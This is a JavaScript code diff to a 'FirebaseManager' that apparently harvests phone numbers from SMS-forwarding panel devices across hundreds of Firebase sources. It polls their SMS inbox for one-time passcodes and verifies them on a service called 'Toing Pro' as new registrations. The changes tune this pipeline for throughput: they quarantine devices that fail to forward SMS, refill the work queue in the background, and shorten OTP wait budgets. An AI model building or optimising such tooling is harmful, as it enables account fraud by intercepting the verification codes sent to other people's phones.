@@ -117,24 +117,20 @@ export class FirebaseManager {
     this.currentUnseenSize = 0;
   }
 
-  _recordSourceOtpOutcome(source, receivedOtp) {
+  // OTP delivery is the only real proof a panel works. Persist it per source
+  // AND per device so the next pass skips both (this survives restarts —
+  // the old in-memory streak was lost on every redeploy).
+  _recordSourceOtpOutcome(source, receivedOtp, { deviceId = '', latencyMs = 0 } = {}) {
     const srcId = source?.id;
     if (!srcId) return;
-    if (receivedOtp) {
-      this._sourceTimeoutStreaks.delete(srcId);
-      return;
-    }
-    const streak = (this._sourceTimeoutStreaks.get(srcId) || 0) + 1;
-    this._sourceTimeoutStreaks.set(srcId, streak);
-    if (streak >= 3) {
-      this._sourceTimeoutStreaks.set(srcId, 0);
-      try {
-        this.db.recordFirebaseSourceResult(srcId, {
-          ok: false,
-          error: `otp_timeout_streak (${streak})`,
-        });
-      } catch {}
-    }
+    try {
+      this.db.recordFirebaseOtpResult(srcId, {
+        ok: Boolean(receivedOtp),
+        sourceKey: source?.url || '',
+        deviceId: deviceId || '',
+        latencyMs: Number(latencyMs) || 0,
+      });
+    } catch {}
   }
 
   async start() {
@@ -219,23 +215,58 @@ export class FirebaseManager {
   }
 
   // ── Shared Pool Coordinator (Serialized across all N parallel lanes) ──────
-  async _pullCandidate() {
-    if (this._hotQueue.length > 0) {
-      return this._hotQueue.shift();
-    }
-    if (this._isAborted()) return null;
+  // Lanes used to block on a single shared refill: when the hot queue ran dry
+  // every lane parked until one source scan finished, so a run of 983 sources
+  // advanced one scan at a time and lanes sat idle. Now a refill is kicked off
+  // in the background as soon as the queue drops below a low-water mark, and a
+  // lane that finds nothing waits at most one short slice before re-checking.
+  _lowWaterMark() {
+    const cfg = this.getRuntimeConfig();
+    const lanes = Math.max(1, Math.min(30, Number(cfg.firebaseConcurrency) || 12));
+    return Math.max(2, lanes);
+  }
 
-    if (!this._refillPromise) {
-      this._refillPromise = this._refillHotQueue().finally(() => {
+  _kickRefill() {
+    if (this._refillPromise || this._isAborted()) return this._refillPromise;
+    if (this._hotQueue.length >= this._lowWaterMark()) return null;
+    this._refillPromise = this._refillHotQueue()
+      .catch(() => {})
+      .finally(() => {
         this._refillPromise = null;
         if (this._resetAfterRefill) {
           this._resetAfterRefill = false;
           this._resetCoordinator();
         }
+        // Immediately top up again if the queue is still starved.
+        if (!this._isAborted() && this._hotQueue.length === 0) {
+          setTimeout(() => this._kickRefill(), 0);
+        }
       });
+    return this._refillPromise;
+  }
+
+  async _pullCandidate() {
+    if (this._hotQueue.length > 0) {
+      this._kickRefill(); // keep the pipeline full behind us
+      return this._hotQueue.shift();
     }
-    await this._refillPromise;
-    return this._hotQueue.length > 0 ? this._hotQueue.shift() : null;
+    if (this._isAborted()) return null;
+
+    this._kickRefill();
+    if (this._refillPromise) {
+      // Wait for this refill, but never longer than a short slice: if it is
+      // still scanning, the lane re-checks and the next pull may already see
+      // candidates produced by the previous scan.
+      await Promise.race([
+        this._refillPromise,
+        this._sleepInterruptible(750),
+      ]);
+    }
+    if (this._hotQueue.length > 0) {
+      this._kickRefill();
+      return this._hotQueue.shift();
+    }
+    return null;
   }
 
   async _advanceToNextSource() {
@@ -339,9 +370,23 @@ export class FirebaseManager {
         continue;
       }
 
-      // Split device-backed entries vs legacy flat entries
-      const unprobedDeviceEntries = unseen.filter((e) => e.deviceId && !this._probedDevices.has(e.deviceId));
+      // Split device-backed entries vs legacy flat entries.
+      // Devices that already failed to deliver an OTP are skipped entirely —
+      // without this, one dead panel device blocks the whole source forever
+      // (they stay "online" in clients/ but never forward the SMS).
+      const deadDevices = this.db.listQuarantinedDevices(this._currentSource);
+      const unprobedDeviceEntries = unseen.filter(
+        (e) => e.deviceId && !this._probedDevices.has(e.deviceId) && !deadDevices.has(e.deviceId)
+      );
       const legacyEntries = unseen.filter((e) => !e.deviceId);
+      if (!unprobedDeviceEntries.length && unseen.some((e) => e.deviceId)) {
+        // Every device on this source is quarantined for non-delivery.
+        this.db.recordFirebaseOtpResult(this._currentSource.id, {
+          ok: false,
+          sourceKey: this._currentSource.url,
+          deviceId: '',
+        });
+      }
 
       if (!unprobedDeviceEntries.length && !legacyEntries.length) {
         this._currentSource = null;
@@ -357,6 +402,7 @@ export class FirebaseManager {
       const scanRes = await scanFreshDevices(this._currentSource, scanTarget, {
         windowMs: activeWindowMs,
         maxWidenMs: maxActivityAgeMs,
+        skipDevices: deadDevices,
         widenByDoubling: true,
         earlyWidenStepMs: 4_000,
         maxScanMs: 12_000,
@@ -408,7 +454,7 @@ export class FirebaseManager {
         if (this._isAborted()) break;
         if (!candidate) {
           this._setLaneStage(laneNo, 'idle', '', '');
-          await this._sleepInterruptible(1_500);
+          await this._sleepInterruptible(400);
           continue;
         }
         await this._processCandidate(laneNo, candidate);
@@ -615,7 +661,16 @@ export class FirebaseManager {
       }
 
       // 5 + 6. Poll Firebase SMS inbox & verify OTP (with stray/invalid OTP retry loop!)
-      const otpBudgetMs = Math.max(5_000, Number(cfg.firebaseOtpTimeoutMs) || 60_000);
+      // Adaptive budget: a source that already delivered fast does not deserve
+      // the full 60s wait on every number. If this source's best observed OTP
+      // latency is known, wait ~30s more than that (min 30s) — failures on such
+      // a source are far more likely to be dead devices than slow ones.
+      const baseOtpBudgetMs = Math.max(5_000, Number(cfg.firebaseOtpTimeoutMs) || 60_000);
+      const knownLatencyMs = Number(source?.otpBestLatencyMs) || 0;
+      const adaptiveBudgetMs = knownLatencyMs > 0
+        ? Math.min(baseOtpBudgetMs, Math.max(30_000, knownLatencyMs + 30_000))
+        : baseOtpBudgetMs;
+      const otpBudgetMs = Math.max(5_000, adaptiveBudgetMs);
       const otpStartedAt = Date.now();
       const otpDeadline = otpStartedAt + otpBudgetMs;
       const rejectedCodes = new Set();
@@ -629,7 +684,7 @@ export class FirebaseManager {
           const timedOutPhone = lockedPhone;
           this.otpTimeoutsInRun += 1;
           laneState.fails += 1;
-          this._recordSourceOtpOutcome(source, false);
+          this._recordSourceOtpOutcome(source, false, { deviceId: entry?.deviceId || '' });
           this.db.recordMetric(laneSlotId, 'otp_timeout', Date.now() - cycleStart);
           const coolMin = Number(cfg.otpTimeoutCooldownMin ?? 10);
           if (coolMin > 0) {
@@ -674,7 +729,7 @@ export class FirebaseManager {
           const timedOutPhone = lockedPhone;
           this.otpTimeoutsInRun += 1;
           laneState.fails += 1;
-          this._recordSourceOtpOutcome(source, false);
+          this._recordSourceOtpOutcome(source, false, { deviceId: entry?.deviceId || '' });
           this.db.recordMetric(laneSlotId, 'otp_timeout', Date.now() - cycleStart);
           const coolMin = Number(cfg.otpTimeoutCooldownMin ?? 10);
           if (coolMin > 0) {
@@ -697,7 +752,10 @@ export class FirebaseManager {
           return { ok: false, reason: 'otp_timeout' };
         }
 
-        this._recordSourceOtpOutcome(source, true);
+        this._recordSourceOtpOutcome(source, true, {
+          deviceId: entry?.deviceId || '',
+          latencyMs: otpRes.ts ? otpRes.ts - otpStartedAt : Date.now() - otpStartedAt,
+        });
 
         // Verify OTP on Toing Pro (is_new: true)
         this._setLaneStage(laneNo, 'verifying', lockedPhone, sourceName);
